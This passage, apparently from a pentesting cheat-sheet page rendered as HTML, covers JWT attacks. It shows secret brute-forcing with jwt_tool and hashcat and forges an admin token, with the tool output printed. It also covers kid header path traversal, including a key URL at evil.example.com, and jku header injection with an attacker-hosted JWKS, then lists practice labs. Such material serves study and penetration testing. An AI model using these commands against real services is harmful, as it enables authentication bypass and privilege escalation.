+<a id="__codelineno-16-8" name="__codelineno-16-8" href="#__codelineno-16-8"></a><span class="n">Token</span> <span class="n">payload</span> <span class="n">values</span><span class="p">:</span>
+<a id="__codelineno-16-9" name="__codelineno-16-9" href="#__codelineno-16-9"></a><span class="p">[+]</span> <span class="n">name</span> <span class="p">=</span> <span class="s2">&quot;John Doe&quot;</span>
+</code></pre></div></li>
+<li>Using <a href="https://pyjwt.readthedocs.io/en/stable/">pyjwt</a>: <code>pip install pyjwt</code>
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="kn">import</span> <span class="nn">jwt</span>
+<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="n">encoded</span> <span class="o">=</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">({</span><span class="s1">&#39;some&#39;</span><span class="p">:</span> <span class="s1">&#39;payload&#39;</span><span class="p">},</span> <span class="s1">&#39;secret&#39;</span><span class="p">,</span> <span class="n">algorithm</span><span class="o">=</span><span class="s1">&#39;HS256&#39;</span><span class="p">)</span>
+<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="n">jwt</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">encoded</span><span class="p">,</span> <span class="s1">&#39;secret&#39;</span><span class="p">,</span> <span class="n">algorithms</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;HS256&#39;</span><span class="p">])</span> 
+</code></pre></div></li>
+</ul>
+<h3 id="break-jwt-secret">Break JWT secret</h3>
+<p>Useful list of 3502 public-available JWT: <a href="https://github.com/wallarm/jwt-secrets/blob/master/jwt.secrets.list">wallarm/jwt-secrets/jwt.secrets.list</a>, including <code>your_jwt_secret</code>, <code>change_this_super_secret_random_string</code>, etc.</p>
+<h4 id="jwt-tool">JWT tool</h4>
+<p>First, bruteforce the "secret" key used to compute the signature using <a href="https://github.com/ticarpi/jwt_tool">ticarpi/jwt_tool</a></p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a><span class="n">python3</span> <span class="n">-m</span> <span class="n">pip</span> <span class="n">install</span> <span class="n">termcolor</span> <span class="n">cprint</span> <span class="n">pycryptodomex</span> <span class="n">requests</span>
+<a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a><span class="n">python3</span> <span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="n">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="p">.</span><span class="n">eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9</span><span class="p">.</span><span class="n">1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI</span> <span class="n">-d</span> <span class="p">/</span><span class="n">tmp</span><span class="p">/</span><span class="n">wordlist</span> <span class="n">-C</span>
+</code></pre></div>
+<p>Then edit the field inside the JSON Web Token.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="n">Current</span> <span class="n">value</span> <span class="n">of</span> <span class="n">role</span> <span class="n">is</span><span class="p">:</span> <span class="n">user</span>
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="n">Please</span> <span class="n">enter</span> <span class="n">new</span> <span class="n">value</span> <span class="n">and</span> <span class="n">hit</span> <span class="n">ENTER</span>
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="p">&gt;</span> <span class="n">admin</span>
+<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="p">[</span><span class="n">1</span><span class="p">]</span> <span class="n">sub</span> <span class="p">=</span> <span class="n">1234567890</span>
+<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="p">[</span><span class="n">2</span><span class="p">]</span> <span class="n">role</span> <span class="p">=</span> <span class="n">admin</span>
+<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="p">[</span><span class="n">3</span><span class="p">]</span> <span class="n">iat</span> <span class="p">=</span> <span class="n">1516239022</span>
+<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a><span class="p">[</span><span class="n">0</span><span class="p">]</span> <span class="k">Continue</span> <span class="n">to</span> <span class="n">next</span> <span class="n">step</span>
+<a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>
+<a id="__codelineno-19-9" name="__codelineno-19-9" href="#__codelineno-19-9"></a><span class="n">Please</span> <span class="nb">select </span><span class="n">a</span> <span class="n">field</span> <span class="n">number</span> <span class="p">(</span><span class="n">or</span> <span class="n">0</span> <span class="n">to</span> <span class="k">Continue</span><span class="p">):</span>
+<a id="__codelineno-19-10" name="__codelineno-19-10" href="#__codelineno-19-10"></a><span class="p">&gt;</span> <span class="n">0</span>
+</code></pre></div>
+<p>Finally, finish the token by signing it with the previously retrieved "secret" key.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="n">Token</span> <span class="n">Signing</span><span class="p">:</span>
+<a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="p">[</span><span class="n">1</span><span class="p">]</span> <span class="n">Sign</span> <span class="n">token</span> <span class="n">with</span> <span class="n">known</span> <span class="n">key</span>
+<a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a><span class="p">[</span><span class="n">2</span><span class="p">]</span> <span class="n">Strip</span> <span class="n">signature</span> <span class="n">from</span> <span class="n">token</span> <span class="n">vulnerable</span> <span class="n">to</span> <span class="n">CVE</span><span class="p">-</span><span class="n">2015</span><span class="p">-</span><span class="n">2951</span>
+<a id="__codelineno-20-4" name="__codelineno-20-4" href="#__codelineno-20-4"></a><span class="p">[</span><span class="n">3</span><span class="p">]</span> <span class="n">Sign</span> <span class="n">with</span> <span class="n">Public</span> <span class="n">Key</span> <span class="n">bypass</span> <span class="n">vulnerability</span>
+<a id="__codelineno-20-5" name="__codelineno-20-5" href="#__codelineno-20-5"></a><span class="p">[</span><span class="n">4</span><span class="p">]</span> <span class="n">Sign</span> <span class="n">token</span> <span class="n">with</span> <span class="n">key</span> <span class="n">file</span>
+<a id="__codelineno-20-6" name="__codelineno-20-6" href="#__codelineno-20-6"></a>
+<a id="__codelineno-20-7" name="__codelineno-20-7" href="#__codelineno-20-7"></a><span class="n">Please</span> <span class="nb">select </span><span class="n">an</span> <span class="n">option</span> <span class="n">from</span> <span class="n">above</span> <span class="p">(</span><span class="n">1</span><span class="p">-</span><span class="n">4</span><span class="p">):</span>
+<a id="__codelineno-20-8" name="__codelineno-20-8" href="#__codelineno-20-8"></a><span class="p">&gt;</span> <span class="n">1</span>
+<a id="__codelineno-20-9" name="__codelineno-20-9" href="#__codelineno-20-9"></a>
+<a id="__codelineno-20-10" name="__codelineno-20-10" href="#__codelineno-20-10"></a><span class="n">Please</span> <span class="n">enter</span> <span class="n">the</span> <span class="n">known</span> <span class="n">key</span><span class="p">:</span>
+<a id="__codelineno-20-11" name="__codelineno-20-11" href="#__codelineno-20-11"></a><span class="p">&gt;</span> <span class="n">secret</span>
+<a id="__codelineno-20-12" name="__codelineno-20-12" href="#__codelineno-20-12"></a>
+<a id="__codelineno-20-13" name="__codelineno-20-13" href="#__codelineno-20-13"></a><span class="n">Please</span> <span class="n">enter</span> <span class="n">the</span> <span class="n">key</span> <span class="n">length</span><span class="p">:</span>
+<a id="__codelineno-20-14" name="__codelineno-20-14" href="#__codelineno-20-14"></a><span class="p">[</span><span class="n">1</span><span class="p">]</span> <span class="n">HMAC-SHA256</span>
+<a id="__codelineno-20-15" name="__codelineno-20-15" href="#__codelineno-20-15"></a><span class="p">[</span><span class="n">2</span><span class="p">]</span> <span class="n">HMAC-SHA384</span>
+<a id="__codelineno-20-16" name="__codelineno-20-16" href="#__codelineno-20-16"></a><span class="p">[</span><span class="n">3</span><span class="p">]</span> <span class="n">HMAC-SHA512</span>
+<a id="__codelineno-20-17" name="__codelineno-20-17" href="#__codelineno-20-17"></a><span class="p">&gt;</span> <span class="n">1</span>
+<a id="__codelineno-20-18" name="__codelineno-20-18" href="#__codelineno-20-18"></a>
+<a id="__codelineno-20-19" name="__codelineno-20-19" href="#__codelineno-20-19"></a><span class="n">Your</span> <span class="n">new</span> <span class="n">forged</span> <span class="n">token</span><span class="p">:</span>
+<a id="__codelineno-20-20" name="__codelineno-20-20" href="#__codelineno-20-20"></a><span class="p">[+]</span> <span class="n">URL</span> <span class="n">safe</span><span class="p">:</span> <span class="n">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="p">.</span><span class="n">eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ</span><span class="p">.</span><span class="n">xbUXlOQClkhXEreWmB3da_xtBsT0Kjw7truyhDwF5Ic</span>
+<a id="__codelineno-20-21" name="__codelineno-20-21" href="#__codelineno-20-21"></a><span class="p">[+]</span> <span class="n">Standard</span><span class="p">:</span> <span class="n">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><span class="p">.</span><span class="n">eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ</span><span class="p">.</span><span class="n">xbUXlOQClkhXEreWmB3da</span><span class="p">/</span><span class="n">xtBsT0Kjw7truyhDwF5Ic</span>
+</code></pre></div>
+<ul>
+<li>Recon: <code>python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw</code></li>
+<li>Scanning: <code>python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -M pb</code></li>
+<li>Exploitation: <code>python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin</code></li>
+<li>Fuzzing: <code>python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -I -hc kid -hv custom_sqli_vectors.txt</code></li>
+<li>Review: <code>python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin</code></li>
+</ul>
+<h4 id="hashcat">Hashcat</h4>
+<blockquote>
+<p>Support added to crack JWT (JSON Web Token) with hashcat at 365MH/s on a single GTX1080 - <a href="https://twitter.com/hashcat/status/955154646494040065">src</a></p>
+</blockquote>
+<ul>
+<li>Dictionary attack: <code>hashcat -a 0 -m 16500 jwt.txt wordlist.txt</code></li>
+<li>Rule-based attack: <code>hashcat -a 0 -m 16500 jwt.txt passlist.txt -r rules/best64.rule</code></li>
+<li>Brute force attack: <code>hashcat -a 3 -m 16500 jwt.txt ?u?l?l?l?l?l?l?l -i --increment-min=6</code></li>
+</ul>
+<h2 id="jwt-claims">JWT Claims</h2>
+<p><a href="https://www.iana.org/assignments/jwt/jwt.xhtml">IANA's JSON Web Token Claims</a></p>
+<h3 id="jwt-kid-claim-misuse">JWT kid Claim Misuse</h3>
+<p>The "kid" (key ID) claim in a JSON Web Token (JWT) is an optional header parameter that is used to indicate the identifier of the cryptographic key that was used to sign or encrypt the JWT. It is important to note that the key identifier itself does not provide any security benefits, but rather it enables the recipient to locate the key that is needed to verify the integrity of the JWT.</p>
+<ul>
+<li>
+<p>Example #1 : Local file
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="p">{</span>
+<a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a><span class="nt">&quot;alg&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;HS256&quot;</span><span class="p">,</span>
+<a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a><span class="nt">&quot;typ&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;JWT&quot;</span><span class="p">,</span>
+<a id="__codelineno-21-4" name="__codelineno-21-4" href="#__codelineno-21-4"></a><span class="nt">&quot;kid&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;/root/res/keys/secret.key&quot;</span>
+<a id="__codelineno-21-5" name="__codelineno-21-5" href="#__codelineno-21-5"></a><span class="p">}</span>
+</code></pre></div></p>
+</li>
+<li>
+<p>Example #2 : Remote file
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="p">{</span>
+<a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="w">    </span><span class="nt">&quot;alg&quot;</span><span class="p">:</span><span class="s2">&quot;RS256&quot;</span><span class="p">,</span>
+<a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a><span class="w">    </span><span class="nt">&quot;typ&quot;</span><span class="p">:</span><span class="s2">&quot;JWT&quot;</span><span class="p">,</span>
+<a id="__codelineno-22-4" name="__codelineno-22-4" href="#__codelineno-22-4"></a><span class="w">    </span><span class="nt">&quot;kid&quot;</span><span class="p">:</span><span class="s2">&quot;http://localhost:7070/privKey.key&quot;</span>
+<a id="__codelineno-22-5" name="__codelineno-22-5" href="#__codelineno-22-5"></a><span class="p">}</span>
+</code></pre></div></p>
+</li>
+</ul>
+<p>The content of the file specified in the kid header will be used to generate the signature.</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="c1">// Example for HS256</span>
+<a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="nx">HMACSHA256</span><span class="p">(</span>
+<a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="w">  </span><span class="nx">base64UrlEncode</span><span class="p">(</span><span class="nx">header</span><span class="p">)</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s2">&quot;.&quot;</span><span class="w"> </span><span class="o">+</span>
+<a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="w">  </span><span class="nx">base64UrlEncode</span><span class="p">(</span><span class="nx">payload</span><span class="p">),</span>
+<a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="w">  </span><span class="nx">your</span><span class="o">-</span><span class="mf">256</span><span class="o">-</span><span class="nx">bit</span><span class="o">-</span><span class="nx">secret</span><span class="o">-</span><span class="kr">from</span><span class="o">-</span><span class="nx">secret</span><span class="p">.</span><span class="nx">key</span>
+<a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="p">)</span>
+</code></pre></div>
+<p>The common ways to misuse the kid header:
+* Get the key content to change the payload
+* Change the key path to force your own
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a><span class="o">&gt;&gt;&gt;</span> <span class="n">jwt</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span>
+<a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a><span class="o">...</span>     <span class="p">{</span><span class="s2">&quot;some&quot;</span><span class="p">:</span> <span class="s2">&quot;payload&quot;</span><span class="p">},</span>
+<a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a><span class="o">...</span>     <span class="s2">&quot;secret&quot;</span><span class="p">,</span>
+<a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a><span class="o">...</span>     <span class="n">algorithm</span><span class="o">=</span><span class="s2">&quot;HS256&quot;</span><span class="p">,</span>
+<a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a><span class="o">...</span>     <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;kid&quot;</span><span class="p">:</span> <span class="s2">&quot;http://evil.example.com/custom.key&quot;</span><span class="p">},</span>
+<a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a><span class="o">...</span> <span class="p">)</span>
+</code></pre></div></p>
+<ul>
+<li>
+<p>Change the key path to a file with a predictable content.
+  <div class="highlight"><pre><span></span><code><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="n">python3</span> <span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="p">&lt;</span><span class="n">JWT</span><span class="p">&gt;</span> <span class="n">-I</span> <span class="n">-hc</span> <span class="n">kid</span> <span class="n">-hv</span> <span class="s2">&quot;../../dev/null&quot;</span> <span class="n">-S</span> <span class="n">hs256</span> <span class="n">-p</span> <span class="s2">&quot;&quot;</span>
+<a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="n">python3</span> <span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="p">&lt;</span><span class="n">JWT</span><span class="p">&gt;</span> <span class="n">-I</span> <span class="n">-hc</span> <span class="n">kid</span> <span class="n">-hv</span> <span class="s2">&quot;/proc/sys/kernel/randomize_va_space&quot;</span> <span class="n">-S</span> <span class="n">hs256</span> <span class="n">-p</span> <span class="s2">&quot;2&quot;</span>
+</code></pre></div></p>
+</li>
+<li>
+<p>Modify the kid header to attempt SQL and Command Injections</p>
+</li>
+</ul>
+<h3 id="jwks-jku-header-injection">JWKS - jku header injection</h3>
+<p>"jku" header value points to the URL of the JWKS file. By replacing the "jku" URL with an attacker-controlled URL containing the Public Key, an attacker can use the paired Private Key to sign the token and let the service retrieve the malicious Public Key and verify the token.</p>
+<p>It is sometimes exposed publicly via a standard endpoint:</p>
+<ul>
+<li><code>/jwks.json</code></li>
+<li><code>/.well-known/jwks.json</code></li>
+<li><code>/openid/connect/jwks.json</code></li>
+<li><code>/api/keys</code></li>
+<li><code>/api/v1/keys</code></li>
+</ul>
+<p>You should create your own key pair for this attack and host it. It should look like that:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="p">{</span>
+<a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="w">    </span><span class="nt">&quot;keys&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span>
+<a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="w">        </span><span class="p">{</span>
+<a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="w">            </span><span class="nt">&quot;kid&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;beaefa6f-8a50-42b9-805a-0ab63c3acc54&quot;</span><span class="p">,</span>
+<a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="w">            </span><span class="nt">&quot;kty&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;RSA&quot;</span><span class="p">,</span>
+<a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a><span class="w">            </span><span class="nt">&quot;e&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;AQAB&quot;</span><span class="p">,</span>
+<a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a><span class="w">            </span><span class="nt">&quot;n&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;nJB2vtCIXwO8DN[...]lu91RySUTn0wqzBAm-aQ&quot;</span>
+<a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a><span class="w">        </span><span class="p">}</span>
+<a id="__codelineno-26-9" name="__codelineno-26-9" href="#__codelineno-26-9"></a><span class="w">    </span><span class="p">]</span>
+<a id="__codelineno-26-10" name="__codelineno-26-10" href="#__codelineno-26-10"></a><span class="p">}</span>
+</code></pre></div>
+<p><strong>Exploit</strong>:</p>
+<ul>
+<li>Using [ticarpi/jwt_tool]
+    <div class="highlight"><pre><span></span><code><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a><span class="n">python3</span> <span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="n">JWT_HERE</span> <span class="n">-X</span> <span class="n">s</span>
+<a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a><span class="n">python3</span> <span class="n">jwt_tool</span><span class="p">.</span><span class="n">py</span> <span class="n">JWT_HERE</span> <span class="n">-X</span> <span class="n">s</span> <span class="n">-ju</span> <span class="n">http</span><span class="p">://</span><span class="n">example</span><span class="p">.</span><span class="n">com</span><span class="p">/</span><span class="n">jwks</span><span class="p">.</span><span class="n">json</span>
+</code></pre></div></li>
+<li>Using <a href="#">portswigger/JWT Editor</a><ol>
+<li>Generate a new RSA key and host it</li>
+<li>Edit JWT's data</li>
+<li>Replace the <code>kid</code> header with the one from your JWKS</li>
+<li>Add a <code>jku</code> header and sign the JWT (<code>Don't modify header</code> option should be checked)</li>
+</ol>
+</li>
+</ul>
+<p><strong>Deconstructed</strong>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="p">{</span><span class="nt">&quot;typ&quot;</span><span class="p">:</span><span class="s2">&quot;JWT&quot;</span><span class="p">,</span><span class="nt">&quot;alg&quot;</span><span class="p">:</span><span class="s2">&quot;RS256&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;jku&quot;</span><span class="p">:</span><span class="s2">&quot;https://example.com/jwks.json&quot;</span><span class="p">,</span><span class="w"> </span><span class="nt">&quot;kid&quot;</span><span class="p">:</span><span class="s2">&quot;id_of_jwks&quot;</span><span class="p">}</span><span class="err">.</span>
+<a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="p">{</span><span class="nt">&quot;login&quot;</span><span class="p">:</span><span class="s2">&quot;admin&quot;</span><span class="p">}</span><span class="err">.</span>
+<a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="p">[</span><span class="err">Sig</span><span class="kc">ne</span><span class="err">d</span><span class="w"> </span><span class="err">wi</span><span class="kc">t</span><span class="err">h</span><span class="w"> </span><span class="kc">ne</span><span class="err">w</span><span class="w"> </span><span class="err">Priva</span><span class="kc">te</span><span class="w"> </span><span class="err">key;</span><span class="w"> </span><span class="err">Public</span><span class="w"> </span><span class="err">key</span><span class="w"> </span><span class="err">expor</span><span class="kc">te</span><span class="err">d</span><span class="p">]</span>
+</code></pre></div>
+<h2 id="labs">Labs</h2>
+<ul>
+<li><a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-unverified-signature">JWT authentication bypass via unverified signature</a></li>
+<li><a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-flawed-signature-verification">JWT authentication bypass via flawed signature verification</a></li>
+<li><a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-weak-signing-key">JWT authentication bypass via weak signing key</a></li>
+<li><a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jwk-header-injection">JWT authentication bypass via jwk header injection</a></li>
+<li><a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-jku-header-injection">JWT authentication bypass via jku header injection</a></li>
+<li><a href="https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal">JWT authentication bypass via kid header path traversal</a></li>
+</ul>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://medium.com/cyberverse/five-easy-steps-to-understand-json-web-tokens-jwt-7665d2ddf4d5">5 Easy Steps to Understanding JSON Web Token</a></li>
+<li><a href="https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/">Attacking JWT authentication - Sep 28, 2016 - Sjoerd Langkemper</a></li>
+<li><a href="https://www.youtube.com/watch?v=d7wmUz57Nlg">Club EH RM 05 - Intro to JSON Web Token Exploitation - Nishacid</a></li>
+<li><a href="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries//">Critical vulnerabilities in JSON Web Token libraries - March 31, 2015 - Tim McLean</a></li>
+<li><a href="https://medium.com/101-writeups/hacking-json-web-token-jwt-233fe6c862e6">Hacking JSON Web Token (JWT) - Hate_401</a></li>
+<li><a href="https://web.archive.org/web/20220305042224/https://blog.websecurify.com/2017/02/hacking-json-web-tokens.html">Hacking JSON Web Tokens - From Zero To Hero Without Effort - Websecurify Blog</a></li>
+<li><a href="https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a">Hacking JSON Web Tokens - medium.com Oct 2019</a></li>
+<li><a href="https://nandynarwhals.org/hitbgsec2017-pasty/">HITBGSEC CTF 2017 - Pasty (Web) - amon (j.heng)</a></li>
+<li><a href="https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9">How to Hack a Weak JWT Implementation with a Timing Attack - Jan 7, 2017 - Tamas Polgar</a></li>
+<li><a href="https://insomniasec.com/blog/auth0-jwt-validation-bypass">JSON Web Token Validation Bypass in Auth0 Authentication API - Ben Knight Senior Security Consultant - April 16, 2020</a></li>
+<li><a href="https://0xn3va.gitbook.io/cheat-sheets/web-application/json-web-token-vulnerabilities">JSON Web Token Vulnerabilities - 0xn3va</a></li>
+<li><a href="https://trustfoundry.net/jwt-hacking-101/">JWT Hacking 101 - TrustFoundry - Tyler Rosonke - December 8th, 2017</a></li>
+<li><a href="https://github.com/dwyl/learn-json-web-tokens">Learn how to use JSON Web Tokens (JWT) for Authentication - @dwylhq</a></li>
+<li><a href="https://blog.securitybreached.org/2018/10/27/privilege-escalation-like-a-boss/">Privilege Escalation like a Boss - October 27, 2018 - janijay007</a></li>
+<li><a href="https://medium.com/@blackhood/simple-jwt-hacking-73870a976750">Simple JWT hacking - @b1ack_h00d</a></li>
+<li><a href="https://ctf.rip/websec-ctf-authorization-token-jwt-challenge/">WebSec CTF - Authorization Token - JWT Challenge</a></li>
+<li><a href="https://web.archive.org/web/20210512205928/https://rootinthemiddle.org/write-up-jrr-token-lehack-2019/">Write up – JRR Token – LeHack 2019 - 07/07/2019 - LAPHAZE</a></li>
+</ul>
+
+  <hr>
+<div class="md-source-file">
+  <small>
+    
+      Last update:
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">March 12, 2023</span>
+      
+    
+  </small>
+</div>
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
+            Back to top
+          </button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    <script id="__config" type="application/json">{"base": "..", "features": ["content.code.copy", "navigation.tracking", "navigation.top"], "search": "../assets/javascripts/workers/search.74e28a9f.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    
+    
+      <script src="../assets/javascripts/bundle.220ee61c.min.js"></script>
+      
+    
+  </body>
+</html>
